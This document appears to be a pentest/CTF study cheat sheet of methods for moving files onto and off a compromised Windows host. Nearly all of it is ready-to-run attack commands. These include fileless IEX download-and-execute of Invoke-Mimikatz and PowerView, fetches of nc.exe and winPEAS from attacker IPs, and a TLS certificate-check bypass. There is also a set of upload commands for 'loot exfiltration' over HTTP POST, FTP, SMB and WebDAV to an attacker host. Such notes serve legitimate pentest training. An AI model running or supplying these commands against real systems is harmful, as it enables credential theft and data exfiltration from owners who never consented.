# Windows File Transfer Methods

## Overview

During CTFs and pentests, Windows file transfer is often needed for:

- downloading tools to target
- uploading loot back to attacker
- transferring scripts and binaries
- operating in restricted shells
- working around blocked protocols

Choice of method depends on:

- available binaries
- outbound network access
- whether fileless execution is possible
- whether interactive shell access exists
- whether SMB / FTP / HTTP is allowed

---

## Quick Workflow

1. identify available tools on target
2. test allowed outbound protocols
3. choose simplest working method
4. verify integrity after transfer
5. clean up temporary files if needed

---

# Download Operations

## Scenario

We have access to a Windows target and need to **download a file from our attacker machine / Pwnbox onto the Windows host**.

---

# 1. PowerShell Base64 Encode / Decode

## Use Case

Useful when:

- network transfer is not possible
- file is small enough to copy/paste
- terminal access exists
- web shell or restricted shell still allows long input

Good for:

- SSH keys
- short scripts
- config files
- small text/binary payloads

---

## Check File Hash on Pwnbox

```bash
md5sum id_rsa
```

Example:

```text
4e301756a07ded0a2dd6953abf015278  id_rsa
```

---

## Encode File to Base64 on Pwnbox

```bash
cat id_rsa | base64 -w 0; echo
```

---

## Decode on Windows with PowerShell

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("BASE64_BLOB"))
```

---

## Verify Integrity on Windows

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
```

---

## Notes

- `cmd.exe` maximum command length is **8191 characters**
- very large Base64 blobs may fail in web shells
- useful fallback when no network tools are available

---

# 2. PowerShell Web Downloads

## Overview

Most environments permit outbound HTTP/HTTPS, making this one of the most convenient transfer methods.

PowerShell supports multiple web download approaches.

---

## Net.WebClient Methods

Useful methods:

| Method | Description |
|--------|-------------|
| `OpenRead` | returns data as a stream |
| `DownloadData` | returns data as byte array |
| `DownloadFile` | downloads file to disk |
| `DownloadString` | downloads content as string |
| `DownloadFileAsync` | async disk download |
| `DownloadStringAsync` | async string download |

---

## DownloadFile

```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

---

## DownloadFileAsync

```powershell
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

---

## DownloadString — Fileless Execution

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

Pipeline variant:

```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### Notes
- `IEX` = `Invoke-Expression`
- useful for in-memory execution
- does not need to write script to disk first

---

# 3. Invoke-WebRequest

## Download File

```powershell
Invoke-WebRequest http://10.10.14.189:3333/winPEASx64.exe -OutFile winPEAS.exe
```

Aliases may include:

```powershell
iwr
curl
wget
```

---

## Common Error — Internet Explorer Engine

Error may occur if IE first-launch config is incomplete.

### Problem

```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
```

### Fix

```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

---

## Common Error — Untrusted SSL/TLS Certificate

If HTTPS certificate is not trusted:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

Then retry the download.

---

# 4. SMB Downloads

## Overview

SMB is very effective inside enterprise-style environments.

Attacker side: create SMB share with Impacket.

---

## Create SMB Server on Pwnbox

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

---

## Download File from Share

```cmd
copy \\192.168.220.133\share\nc.exe
```

---

## SMB with Username and Password

If guest access is blocked:

### Create authenticated SMB share

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### Mount share on Windows

```cmd
net use n: \\192.168.220.133\share /user:test test
```

### Copy file

```cmd
copy n:\nc.exe
```

---

## Notes

- newer Windows versions often block anonymous guest access
- drive mounting is often more reliable than direct UNC copy

---

# 5. FTP Downloads

## Overview

FTP can be useful when HTTP/SMB are unavailable.

Attacker side: start an FTP server.

---

## Install pyftpdlib

```bash
sudo pip3 install pyftpdlib
```

---

## Start FTP Server

```bash
sudo python3 -m pyftpdlib --port 21
```

Anonymous access is enabled by default unless credentials are specified.

---

## Download with PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

---

## Download with Windows FTP Client (scripted)

### Create FTP command file

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
```

### Run FTP client

```cmd
ftp -v -n -s:ftpcommand.txt
```

---

# Upload Operations

## Scenario

We need to **upload files from the Windows target back to our attacker machine / Pwnbox**.

Typical use cases:

- loot exfiltration
- password cracking material
- log collection
- config extraction
- proof files

---

# 6. PowerShell Base64 Upload

## Encode File on Windows

```powershell
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Encoding Byte))
```

---

## Hash File on Windows

```powershell
Get-FileHash "C:\Windows\System32\drivers\etc\hosts" -Algorithm MD5 | Select Hash
```

---

## Decode on Linux

```bash
echo BASE64_BLOB | base64 -d > hosts
md5sum hosts
```

Compare the resulting MD5 hash.

---

# 7. PowerShell Web Uploads

## Overview

PowerShell has no simple built-in upload cmdlet, but uploads can be performed using helper scripts and HTTP POST methods.

---

## Start Upload Server on Attacker Host

```bash
pip3 install uploadserver
python3 -m uploadserver
```

---

## Use PSUpload.ps1

Load script:

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

Upload file:

```powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

---

# 8. Base64 Web Upload with POST

## Encode File

```powershell
$b64 = [System.Convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```

## Send POST Request

```powershell
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

## Catch on Attacker Host

```bash
nc -lvnp 8000
```

## Decode on Linux

```bash
echo BASE64_BLOB | base64 -d -w 0 > hosts
```

---

# 9. SMB Uploads via WebDAV

## Overview

If outbound SMB is blocked, WebDAV over HTTP can be a useful workaround.

Windows can access WebDAV paths using the special `DavWWWRoot` path.

---

## Install WebDAV Server Components on Attacker Host

```bash
sudo pip3 install wsgidav cheroot
```

---

## Start WebDAV Server

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

---

## Browse Share from Windows

```cmd
dir \\192.168.49.128\DavWWWRoot
```

---

## Upload File via Copy

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

Or to a specific folder:

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

---

## Notes

- `DavWWWRoot` is a special Windows shell keyword
- if no outbound SMB restrictions exist, `impacket-smbserver` is often simpler

---

# 10. FTP Uploads

## Start FTP Server with Write Enabled

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

---

## Upload with PowerShell

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

---

## Upload with Windows FTP Client (scripted)

### Create FTP command file

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
```

### Run FTP client

```cmd
ftp -v -n -s:ftpcommand.txt
```

---

# When to Use What

| Method | Best For | Notes |
|--------|----------|------|
| Base64 | small files / no network | copy-paste only |
| `Net.WebClient` | HTTP/HTTPS/FTP download | common and flexible |
| `Invoke-WebRequest` | straightforward web download | slower but convenient |
| SMB | internal network transfer | very effective when allowed |
| FTP | fallback protocol | useful in restricted shells |
| PSUpload | HTTP upload | simple web upload |
| WebDAV | HTTP-based file share | useful when SMB blocked |
| Base64 POST | minimal upload method | good fallback |

---

# Integrity Checking

## Linux

```bash
md5sum file
sha256sum file
```

## Windows

```powershell
Get-FileHash file -Algorithm MD5
Get-FileHash file -Algorithm SHA256
```

Prefer SHA256 where practical.

---

# Cheatsheet

## Base64

```bash
# linux encode
cat file | base64 -w 0; echo
```

```powershell
# windows decode
[IO.File]::WriteAllBytes("C:\Users\Public\file", [Convert]::FromBase64String("BASE64_BLOB"))
```

```powershell
# windows encode
[Convert]::ToBase64String((Get-Content -Path "C:\path\file" -Encoding Byte))
```

```bash
# linux decode
echo BASE64_BLOB | base64 -d > file
```

## PowerShell Web

```powershell
(New-Object Net.WebClient).DownloadFile('URL','C:\path\file')
(New-Object Net.WebClient).DownloadString('URL') | IEX
Invoke-WebRequest URL -OutFile file
Invoke-WebRequest URL -UseBasicParsing | IEX
```

## TLS Bypass

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
copy \\IP\share\file
net use n: \\IP\share /user:test test
copy n:\file
```

## FTP

```bash
sudo python3 -m pyftpdlib --port 21
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://IP/file.txt','C:\path\file.txt')
(New-Object Net.WebClient).UploadFile('ftp://IP/file.txt','C:\path\file.txt')
```

```cmd
ftp -v -n -s:ftpcommand.txt
```

## Web Upload

```bash
pip3 install uploadserver
python3 -m uploadserver
```

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://IP:8000/upload -File C:\path\file
```

## WebDAV

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```cmd
dir \\IP\DavWWWRoot
copy C:\path\file \\IP\DavWWWRoot\
```

---

# Tags

#file-transfer #windows #powershell #smb #ftp #webdav #base64 #ctf #oscp #pentest